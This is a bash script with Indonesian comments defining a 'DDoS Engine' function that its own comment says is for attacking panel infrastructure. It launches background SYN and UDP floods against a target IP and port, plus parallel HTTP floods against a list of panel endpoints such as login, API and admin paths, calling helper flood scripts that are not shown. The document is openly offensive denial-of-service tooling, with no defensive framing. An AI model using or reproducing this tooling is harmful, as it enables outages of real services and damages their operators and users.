#!/bin/bash

# DDoS Engine untuk menyerang infrastruktur panel

start_ddos() {
    local duration=$1
    local threads=$2
    
    log_info "Initializing DDoS engine..."
    
    # Generate endpoint targets
    local endpoints=(
        "/auth/login"
        "/auth/login?redirect=/dashboard"
        "/api/client"
        "/api/application"
        "/api/remote"
        "/account"
        "/server/new"
        "/admin"
        "/assets/js/app.js"
        "/assets/css/app.css"
    )
    
    # Start SYN flood di background
    log_info "Starting SYN flood on port $PORT"
    python3 "$TOOLS_DIR/syn_flood.py" --target "$TARGET_IP" --port "$PORT" --duration "$duration" &
    SYN_PID=$!
    
    # Start UDP flood
    log_info "Starting UDP flood"
    python3 "$TOOLS_DIR/udp_flood.py" --target "$TARGET_IP" --port "$PORT" --duration "$duration" --size 1400 &
    UDP_PID=$!
    
    # Start HTTP flood untuk setiap endpoint
    for endpoint in "${endpoints[@]}"; do
        local target_url="${TARGET_URL}${endpoint}"
        log_info "Starting HTTP flood on $target_url"
        python3 "$TOOLS_DIR/http_flood.py" --url "$target_url" --duration "$duration" --threads "$threads" &
        HTTP_PIDS+=($!)
        sleep 0.5
    done
    
    # Tunggu semua proses selesai
    wait $SYN_PID $UDP_PID
    for pid in "${HTTP_PIDS[@]}"; do
        wait $pid 2>/dev/null || true
    done
    
    log_success "DDoS engine completed"
}
